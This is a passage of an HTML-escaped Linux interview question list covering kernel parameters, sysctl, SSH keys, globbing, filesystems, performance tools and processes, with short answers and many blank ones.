&lt;b&gt; &lt;li&gt;Allocating memory&lt;/li&gt; &lt;li&gt;Schedule processes&lt;/li&gt; &lt;li&gt;Control CPU &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you find out which Kernel version your system is using?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;uname -a&lt;/code&gt; command &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Linux kernel module and how do you load a new module?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain user space vs. kernel space&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The operating system executes the kernel in protected memory to prevent anyone from changing (and risking it crashing). This is what is known as &#34;Kernel space&#34;. &#34;User space&#34; is where users executes their commands or applications. It&#39;s important to create this separation since we can&#39;t rely on user applications to not tamper with the kernel, causing it to crash.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Applications can access system resources and indirectly the kernel space by making what is called &#34;system calls&#34;. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In what phases of kernel lifecycle, can you change its configuration?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Build time (when it&#39;s compiled)&lt;/li&gt; &lt;li&gt;Boot time (when it starts)&lt;/li&gt; &lt;li&gt;Runtime (once it&#39;s already running) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Where can you find kernel&#39;s configuration?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Usually it will reside in &lt;code&gt;/boot/config-&amp;lt;kernel version&amp;gt;.&amp;lt;os release&amp;gt;.&amp;lt;arch&amp;gt;&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Where can you find the file that contains the command passed to the boot loader to run the kernel?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;/proc/cmdline&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to list kernel&#39;s runtime parameters?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;sysctl -a&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Will running &lt;code&gt;sysctl -a&lt;/code&gt; as a regular user vs. root, produce different result?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Yes, you might notice that in most systems, when running &lt;code&gt;systctl -a&lt;/code&gt; with root, you&#39;ll get more runtime parameters compared to executing the same command with a regular user. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You would like to enable IPv4 forwarding in the kernel, how would you do it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;code&gt;sudo sysctl net.ipv4.ip_forward=1&lt;/code&gt;&lt;/p&gt; &lt;p&gt;To make it persistent (applied after reboot for example): insert &lt;code&gt;net.ipv4.ip_forward = 1&lt;/code&gt; into &lt;code&gt;/etc/sysctl.conf&lt;/code&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Another way to is to run &lt;code&gt;echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How &lt;code&gt;sysctl&lt;/code&gt; applies the changes to kernel&#39;s runtime parameters the moment you run sysctl command?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;If you &lt;code&gt;strace&lt;/code&gt; the sysctl command you can see it does it by changing the file under /proc/sys/...&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;In the past it was done with sysctl system call, but it was deprecated at some point. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How changes to kernel runtime parameters persist? (applied even after reboot to the system for example)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;There is a service called &lt;code&gt;systemd-sysctl&lt;/code&gt; that takes the content of /etc/sysctl.conf and applies it. This is how changes persist, even after reboot, when they are written in /etc/sysctl.conf &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Are the changes you make to kernel parameters in a container, affects also the kernel parameters of the host on which the container runs?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;No. Containers have their own /proc filesystem so any change to kernel parameters inside a container, are not affecting the host or other containers running on that host. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - SSH&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SSH? How to check if a Linux server is running SSH?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/SSH_(Secure_Shell)&#34;&gt;Wikipedia Definition&lt;/a&gt;: &#34;SSH or Secure Shell is a cryptographic network protocol for operating network services securely over an unsecured network.&#34;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://www.hostinger.com/tutorials/ssh-tutorial-how-does-ssh-work&#34;&gt;Hostinger.com Definition&lt;/a&gt;: &#34;SSH, or Secure Shell, is a remote administration protocol that allows users to control and modify their remote servers over the Internet.&#34;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;An SSH server will have SSH daemon running. Depends on the distribution, you should be able to check whether the service is running (e.g. systemctl status sshd). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why SSH is considered better than telnet?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Telnet also allows you to connect to a remote host but as opposed to SSH where the communication is encrypted, in telnet, the data is sent in clear text, so it doesn&#39;t considered to be secured because anyone on the network can see what exactly is sent, including passwords. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is stored in &lt;code&gt;~/.ssh/known_hosts&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The file stores the key fingerprints for the clients connecting to the SSH server. This fingerprint creates a trust between the client and the server for future SSH connections. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You try to ssh to a server and you get &#34;Host key verification failed&#34;. What does it mean?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It means that the key of the remote host was changed and doesn&#39;t match the one that stored on the machine (in ~/.ssh/known_hosts). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between SSH and SSL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &lt;code&gt;ssh-keygen&lt;/code&gt; is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;code&gt;ssh-keygen&lt;/code&gt; is a tool to generate an authentication key pair for SSH, that consists of a private and a public key. It supports a number of algorithms to generate authentication keys :&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;dsa&lt;/li&gt; &#xA;   &lt;li&gt;ecdsa&lt;/li&gt; &#xA;   &lt;li&gt;ecdsa-sk&lt;/li&gt; &#xA;   &lt;li&gt;ed25519&lt;/li&gt; &#xA;   &lt;li&gt;ed25519-sk&lt;/li&gt; &#xA;   &lt;li&gt;rsa (default)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;p&gt;One can also specify number of bits in key. Command below generates an SSH key pair with RSA 4096-bits :&lt;/p&gt; &lt;pre&gt;&lt;code&gt;$ ssh-keygen -t rsa -b 4096&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;The output looks like this:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Generating public/private rsa key pair.&#xA;Enter file in which to save the key (/home/user/.ssh/id_rsa): &#xA;Enter passphrase (empty for no passphrase): &#xA;Enter same passphrase again: &#xA;Your identification has been saved in /home/user/.ssh/id_rsa&#xA;Your public key has been saved in /home/user/.ssh/id_rsa.pub&#xA;The key fingerprint is:&#xA;SHA256:f5MOGnhzYfC0ZCHvbSXXiRiNVYETjxpHcXD5xSojx+M user@mac-book-pro&#xA;The key&#39;s randomart image is:&#xA;+---[RSA 4096]----+&#xA;|        . ..+***o|&#xA;|         o o++*o+|&#xA;|        . =+.++++|&#xA;|         B.oX+. .|&#xA;|        S *=o+   |&#xA;|       . o oE.   |&#xA;|      . + + +    |&#xA;|       . = + .   |&#xA;|        .   .    |&#xA;+----[SHA256]-----+&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;One can check how many bits an SSH key has with :&lt;/p&gt; &lt;pre&gt;&lt;code&gt;$ ssh-keygen -l -f /home/user/.ssh/id_rsa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Output should look like this :&lt;/p&gt; &lt;pre&gt;&lt;code&gt;4096 SHA256:f5MOGnhzYfC0ZCHvbSXXiRiNVYETjxpHcXD5xSojx+M user@mac-book-pro (RSA)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;It shows the key is RSA 4096-bits.&lt;/p&gt; &lt;p&gt;&lt;code&gt;-l&lt;/code&gt; and &lt;code&gt;-f&lt;/code&gt; parameters usage explanation :&lt;/p&gt; &lt;pre&gt;&lt;code&gt;-l          Show the fingerprint of the key file.&#xA;-f filename Filename of the key file.&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Learn more : &lt;a href=&#34;https://superuser.com/a/139311&#34;&gt;How can I tell how many bits my ssh key is? - Superuser&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SSH port forwarding?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Linux - Globbing, Wildcards&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Globbing?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are wildcards? Can you give an example of how to use them?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what will &lt;code&gt;ls [XYZ]&lt;/code&gt; match&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what will &lt;code&gt;ls [^XYZ]&lt;/code&gt; match&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what will &lt;code&gt;ls [0-5]&lt;/code&gt; match&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What each of the following matches &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;?&lt;/li&gt; &#xA;   &lt;li&gt;*&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;The ? matches any single character&lt;/li&gt; &lt;li&gt;The * matches zero or more characters &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What do we grep for in each of the following commands?: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;grep &#39;[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}&#39; some_file&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;grep -E &#34;error|failure&#34; some_file&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;grep &#39;[0-9]$&#39; some_file&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;An IP address&lt;/li&gt; &lt;li&gt;The word &#34;error&#34; or &#34;failure&#34;&lt;/li&gt; &lt;li&gt;Lines which end with a number &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which line numbers will be printed when running `grep &#39;\baaa\b&#39;` on the following content: &lt;p&gt;aaa bbb ccc.aaa aaaaaa&lt;/p&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;&lt;p&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;lines 1 and 3. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference single and double quotes?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is escaping? What escape character is used for escaping?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an exit code? What exit codes are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;An exit code (or return code) represents the code returned by a child process to its parent process.&lt;/p&gt; &lt;p&gt;0 is an exit code which represents success while anything higher than 1 represents error. Each number has different meaning, based on how the application was developed.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;I consider this as a good blog post to read more about it: &lt;a href=&#34;https://shapeshed.com/unix-exit-codes&#34;&gt;https://shapeshed.com/unix-exit-codes&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux Boot Process&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Tell me everything you know about the Linux boot process&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Another way to ask this: what happens from the moment you turned on the server until you get a prompt &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is GRUB2?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Secure Boot?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you find in /boot?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Linux Disk &amp;amp; Filesystem&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s an inode?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;For each file (and directory) in Linux there is an inode, a data structure which stores meta data related to the file like its size, owner, permissions, etc. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which of the following is not included in inode: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Link count&lt;/li&gt; &#xA;   &lt;li&gt;File size&lt;/li&gt; &#xA;   &lt;li&gt;File name&lt;/li&gt; &#xA;   &lt;li&gt;File timestamp&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;File name (it&#39;s part of the directory file) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check which disks are currently mounted?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Run &lt;code&gt;mount&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You run the &lt;code&gt;mount&lt;/code&gt; command but you get no output. How would you check what mounts you have on your system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;cat /proc/mounts&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between a soft link and hard link?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Hard link is the same file, using the same inode. Soft link is a shortcut to another file, using a different inode. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? You can create an hard link for a directory&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? You can create a soft link between different filesystems&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? Directories always have by minimum 2 links&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens when you delete the original file in case of soft link and hard link?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you check what type of filesystem is used in /home?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;There are many answers for this question. One way is running &lt;code&gt;df -T&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a swap partition? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to create a &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;new empty file&lt;/li&gt; &#xA;   &lt;li&gt;a file with text (without using text editor)&lt;/li&gt; &#xA;   &lt;li&gt;a file with given size&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You are trying to create a new file but you get &#34;File system is full&#34;. You check with df for free space and you see you used only 20% of the space. What could be the problem?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you check what is the size of a certain directory?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;du -sh&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is LVM?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following in regards to LVM: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;PV&lt;/li&gt; &#xA;   &lt;li&gt;VG&lt;/li&gt; &#xA;   &lt;li&gt;LV&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is NFS? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What RAID is used for? Can you explain the differences between RAID 0, 1, 5 and 10?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe the process of extending a filesystem disk space&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is lazy umount?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is tmpfs?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is stored in each of the following logs? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;/var/log/messages&lt;/li&gt; &#xA;   &lt;li&gt;/var/log/boot.log&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? both /tmp and /var/tmp cleared upon system boot&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. /tmp is cleared upon system boot while /var/tmp is cleared every a couple of days or not cleared at all (depends on distro). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux Performance Analysis&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check what is the current load average?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;One can use &lt;code&gt;uptime&lt;/code&gt; or &lt;code&gt;top&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You know how to see the load average, great. but what each part of it means? for example 1.43, 2.34, 2.78&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;http://www.brendangregg.com/blog/2017-08-08/linux-load-averages.html&#34;&gt;This article&lt;/a&gt; summarizes the load average topic in a great way &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check process usage?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;pidstat &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check disk I/O?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;iostat -xz 1&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check how much free memory a system has? How to check memory consumption by each process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can use the commands &lt;code&gt;top&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check TCP stats?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;sar -n TCP,ETCP 1 &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux Processes&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;how to list all the processes running in your system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;ps -ef&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to run a process in the background and why to do that in the first place?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can achieve that by specifying &amp;amp; at the end of the command. As to why, since some commands/processes can take a lot of time to finish execution or run forever, you may want to run them in the background instead of waiting for them to finish before gaining control 